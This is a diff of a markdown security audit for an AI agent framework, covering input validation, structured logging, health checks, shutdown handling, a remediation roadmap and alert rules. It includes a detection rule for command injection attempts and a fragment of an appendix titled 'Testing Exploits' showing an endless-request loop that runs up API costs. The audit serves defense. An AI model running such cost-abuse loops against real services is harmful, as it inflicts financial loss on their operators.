 Deno.test("AgentExecutor - rejects invalid agent names", async () => {
@@ -3035,6 +3146,7 @@ Deno.test("AgentExecutor - rejects invalid agent names", async () => {
 **Status**: ✅ **Fully Implemented**
 
 **Implementation Summary**:
+
 - Created comprehensive input validation schemas in `src/schemas/input_validation.ts` using Zod
 - Implemented strict validation for all user inputs including blueprint names, portal names, agent IDs, trace IDs, user requests, plans, and model configurations
 - Added input sanitization utilities to prevent XSS, path traversal, and injection attacks
@@ -3045,12 +3157,14 @@ Deno.test("AgentExecutor - rejects invalid agent names", async () => {
 - Backward compatibility maintained with existing functionality
 
 **Files Modified**:
+
 - `src/schemas/input_validation.ts` (new) - Comprehensive input validation schemas and utilities
 - `src/services/agent_executor.ts` - Updated executeStep and loadBlueprint methods to validate inputs
 - `src/ai/provider_factory.ts` - Updated resolveOptions to validate model configurations
 - `tests/schemas/input_validation_test.ts` (new) - Comprehensive test suite
 
 **Key Features Implemented**:
+
 - **Blueprint Name Validation**: Prevents path traversal with regex `^[a-zA-Z0-9_-]+$`
 - **Portal/Agent ID Validation**: Prevents injection attacks with alphanumeric restrictions
 - **User Request/Plan Validation**: Prevents XSS with script/iframe detection and control character removal
@@ -3059,6 +3173,7 @@ Deno.test("AgentExecutor - rejects invalid agent names", async () => {
 - **Comprehensive Testing**: 45 tests covering all attack vectors and edge cases
 
 **Success Criteria Met**:
+
 - ✅ Input validation prevents path traversal attacks
 - ✅ SQL injection attempts are blocked
 - ✅ XSS attacks are prevented in user inputs
@@ -3072,6 +3187,7 @@ Deno.test("AgentExecutor - rejects invalid agent names", async () => {
 ---
 
 ### ⚠️ 17. Lack of Structured Logging & Observability
+
 **Location**: All modules using console.log/console.error
 **Severity**: P2 - Medium
 **Category**: Observability
@@ -3079,6 +3195,7 @@ Deno.test("AgentExecutor - rejects invalid agent names", async () => {
 **Issue**: Inconsistent logging makes debugging and monitoring nearly impossible
 
 **Current Anti-Patterns**:
+
 ```typescript
 // ❌ Multiple inconsistent logging patterns
 
@@ -3099,6 +3216,7 @@ console.log("CRITICAL: Database connection lost");  // Lost in noise
 ```
 
 **Problems**:
+
 1. **No correlation**: Can't trace requests across services
 2. **No searchability**: Can't query logs efficiently
 3. **No alerting**: Can't set up monitors
@@ -3106,6 +3224,7 @@ console.log("CRITICAL: Database connection lost");  // Lost in noise
 5. **Performance overhead**: String concatenation in hot paths
 
 **Complete Solution**:
+
 ```typescript
 // 1. Define structured log interface
 export interface LogEntry {
@@ -3395,6 +3514,7 @@ export const logger = new StructuredLogger({
 ```
 
 **Benefits**:
+
 - **Searchable**: Can query `{"context.agent_id":"agent-123"}`
 - **Traceable**: Follow requests across services via trace_id
 - **Alertable**: Set up monitors on error patterns
@@ -3404,6 +3524,7 @@ export const logger = new StructuredLogger({
 **Status**: ✅ **Fully Implemented**
 
 **Implementation Summary**:
+
 - Created comprehensive `StructuredLogger` class in `src/services/structured_logger.ts` with type-safe logging interfaces
 - Implemented multiple output destinations: `ConsoleOutput` (conditional debug mode only) and `FileOutput` with rotation
 - Added context management for trace IDs, request IDs, user/agent/session tracking, and operation metadata
@@ -3417,6 +3538,7 @@ export const logger = new StructuredLogger({
 - File-based audit logging ensures persistence for compliance and monitoring
 
 **Files Modified**:
+
 - `src/services/structured_logger.ts` (new) - Core structured logging implementation
 - `src/main.ts` - Integration with application startup and conditional console output
 - `src/services/confidence_scorer.ts` - Replaced console.log with structured logging
@@ -3433,6 +3555,7 @@ export const logger = new StructuredLogger({
 - `tests/services/structured_logger_test.ts` (new) - Comprehensive test suite
 
 **Key Features Implemented**:
+
 - **Type-safe LogEntry interface** with timestamp, level, message, context, metadata, error details, and performance data
 - **Context inheritance** through child loggers for request tracing
 - **Performance monitoring** with automatic timing and memory tracking for operations
@@ -3448,6 +3571,7 @@ export const logger = new StructuredLogger({
 - **Rich Context Display** with trace IDs, agent IDs, operation metadata, and session tracking
 
 **TUI Integration Features**:
+
 - **Real-time Log Streaming**: WebSocket/polling-based live log updates with buffering
 - **Advanced Filtering**: Filter by log level, context fields (trace_id, agent_id, operation), time ranges
 - **Correlation Mode**: Group logs by correlation_id for request tracing
@@ -3461,6 +3585,7 @@ export const logger = new StructuredLogger({
 - **Context-aware Display**: Color-coded log levels, icons for different log types
 
 **Success Criteria Met**:
+
 - ✅ **Correlation**: Trace IDs and request IDs enable request tracing across services
 - ✅ **Searchability**: JSON-structured logs support efficient querying and filtering
 - ✅ **Alerting**: Structured error patterns enable monitor setup and automated alerts
@@ -3474,13 +3599,8 @@ export const logger = new StructuredLogger({
 - ✅ **Advanced Analytics**: Correlation analysis, performance tracking, and error pattern detection
 - ✅ **User Experience**: Intuitive navigation, filtering, and detailed log inspection capabilities
 
-***
-
 ### ⚠️ 18. No Health Check / Readiness Endpoints
 
-***
-
-### ⚠️ 18. No Health Check / Readiness Endpoints
 **Location**: Missing from codebase
 **Severity**: P2 - Medium
 **Category**: Observability/Operations
@@ -3488,11 +3608,13 @@ export const logger = new StructuredLogger({
 **Issue**: No way for orchestrators (K8s, Docker, etc.) to check service health
 
 **Required Checks**:
+
 1. **Liveness**: Is the process alive?
 2. **Readiness**: Can it serve requests?
 3. **Startup**: Has initialization completed?
 
 **Complete Implementation**:
+
 ```typescript
 export interface HealthCheck {
   name: string;
@@ -3767,6 +3889,7 @@ async function handleHealthCheck(
 ```
 
 **Usage in Kubernetes**:
+
 ```yaml
 livenessProbe:
   httpGet:
@@ -3787,20 +3910,23 @@ readinessProbe:
 
 **Status**: ❌ Not Implemented
 
-***
+---
 
 ### ⚠️ 19. Missing Graceful Shutdown Handling
+
 **Location**: `src/main.ts` (assumed)
 **Severity**: P2 - Medium
 **Category**: Reliability
 
 **Issue**: No proper cleanup on SIGTERM/SIGINT leads to:
+
 - Database connections left open
 - Incomplete transactions
 - Lost log entries
 - Orphaned subprocess
 
 **Current Pattern** (likely):
+
 ```typescript
 // ❌ No shutdown handling
 async function main() {
@@ -3815,6 +3941,7 @@ main();
 ```
 
 **Complete Solution**:
+
 ```typescript
 export class GracefulShutdown {
   private shuttingDown = false;
@@ -3960,9 +4087,10 @@ main().catch((error) => {
 
 **Status**: ❌ Not Implemented
 
-***
+---
 
 ### ⚠️ 20. Insufficient Error Context in Stack Traces
+
 **Location**: Throughout codebase
 **Severity**: P3 - Low
 **Category**: Debuggability
@@ -3970,6 +4098,7 @@ main().catch((error) => {
 **Issue**: Generic errors make debugging difficult
 
 **Current Pattern**:
+
 ```typescript
 // ❌ Loses context through call stack
 async function processRequest(id: string) {
@@ -3983,6 +4112,7 @@ async function processRequest(id: string) {
 ```
 
 **Solution**:
+
 ```typescript
 export class ContextError extends Error {
   constructor(
@@ -4034,13 +4164,14 @@ async function processRequest(id: string) {
 
 **Status**: ❌ Not Implemented
 
-***
+---
 
 ## Part 5: Summary & Remediation Roadmap
 
 ### Critical Path Remediation (0-2 weeks)
 
-**Week 1: P0 Security Fixes**
+### Week 1: P0 Security Fixes
+
 1. ✅ **Day 1-2**: Fix command injection in git operations
    - Implement path validation
    - Add input sanitization
@@ -4061,49 +4192,56 @@ async function processRequest(id: string) {
    - Configure cost limits
    - Deploy monitoring
 
-**Week 2: P1 Critical Fixes**
+### Week 2: P1 Critical Fixes
+
 1. ✅ **Day 8-10**: Fix race conditions
    - Implement file locking
    - Add atomic operations
    - Test concurrent scenarios
 
 2. ✅ **Day 11-12**: Add comprehensive logging
+
    - Deploy structured logger
    - Add security audit log
    - Configure log shipping
 
 3. ✅ **Day 13-14**: Implement prompt injection defense
+
    - Add input sanitization
    - Use clear delimiters
    - Test bypass attempts
 
-***
+---
 
 ### Medium-Term Improvements (Weeks 3-8)
 
-**Architecture (Weeks 3-4)**
+#### Architecture (Weeks 3-4)
+
 - Implement repository pattern
 - Add circuit breakers
 - Improve connection pooling
 - Add health checks
 
-**Code Quality (Weeks 5-6)**
+#### Code Quality (Weeks 5-6)
+
 - Add comprehensive input validation
 - Implement graceful shutdown
 - Add performance monitoring
 - Improve error handling
 
-**Testing & CI/CD (Weeks 7-8)**
+#### Testing & CI/CD (Weeks 7-8)
+
 - Add security test suite
 - Implement fuzzing tests
 - Add penetration testing
 - Configure SAST/DAST tools
 
-***
+---
 
 ### Security Testing Checklist
 
 **Before Production Deployment**:
+
 - [ ] Run OWASP ZAP scan
 - [ ] Perform manual penetration testing
 - [ ] Review all P0/P1 findings
@@ -4120,11 +4258,12 @@ async function processRequest(id: string) {
 - [ ] Test graceful shutdown
 - [ ] Validate health checks
 
-***
+---
 
 ### Monitoring & Alerting Requirements
 
 **Critical Alerts** (Page on-call):
+
 ```yaml
 - name: "P0 Command Injection Attempt"
   condition: 'log.message contains "path_traversal_blocked"'
@@ -4144,6 +4283,7 @@ async function processRequest(id: string) {
 ```
 
 **Warning Alerts** (Email/Slack):
+
 ```yaml
 - name: "High Memory Usage"
   condition: 'memory_percent > 80%'
@@ -4158,12 +4298,14 @@ async function processRequest(id: string) {
   severity: warning
 ```
 
-***
+---
 
 ### Compliance & Documentation
 
 **Required Documentation**:
+
 1. **Security Architecture Document**
+
    - Threat model
    - Attack surface analysis
    - Defense-in-depth layers
@@ -4187,7 +4329,7 @@ async function processRequest(id: string) {
    - Rate limiting policies
    - Input validation rules
 
-***
+---
 
 ## Conclusion
 
@@ -4209,18 +4351,21 @@ The ExoFrame codebase demonstrates innovative architectural patterns but contain
 ### Recommendations Priority
 
 **IMMEDIATE (This Week)**:
+
 - 🔴 **Deploy emergency patches for P0 issues**
 - 🔴 **Implement basic rate limiting**
 - 🔴 **Add input validation to git operations**
 - 🔴 **Remove API keys from error messages**
 
 **SHORT-TERM (Next 2 Weeks)**:
+
 - 🟠 **Fix all P0 vulnerabilities**
 - 🟠 **Implement comprehensive audit logging**
 - 🟠 **Add security testing to CI/CD**
 - 🟠 **Deploy monitoring & alerting**
 
 **MEDIUM-TERM (1-2 Months)**:
+
 - 🟡 **Refactor architecture for resilience**
 - 🟡 **Add comprehensive health checks**
 - 🟡 **Implement graceful degradation**
@@ -4229,6 +4374,7 @@ The ExoFrame codebase demonstrates innovative architectural patterns but contain
 ### Risk Acceptance
 
 ⚠️ **WARNING**: Operating this system in production WITHOUT fixing P0 issues exposes the organization to:
+
 - Data breach liability
 - Financial loss from API abuse
 - Reputation damage
@@ -4239,7 +4385,7 @@ The ExoFrame codebase demonstrates innovative architectural patterns but contain
 **Estimated Cost**: $80,000 - $120,000
 **Risk if Not Fixed**: CATASTROPHIC
 
-***
+---
 
 ## Appendix: Testing Exploits (For Security Team Only)
 
@@ -4285,9 +4431,8 @@ while (true) {
   });
 }
 // Result: $86,400/day cost
-```
 
-***
+---
 
 **Document Version**: 1.0
 **Date**: January 9, 2026
@@ -4296,7 +4441,7 @@ while (true) {
 
 **Next Review**: After P0 fixes implemented (Est. 2 weeks)
 
-***
+---
 
 ## Quick Reference: File-by-File Status
 
@@ -4313,6 +4458,5 @@ while (true) {
 **Total Findings**: 54 issues across 40+ files reviewed
 
 END OF AUDIT REPORT
-```
 
 This completes the comprehensive security audit document. It's ready to be copied and saved as `.copilot/planning/phase-24-security-architecture-audit.md`.
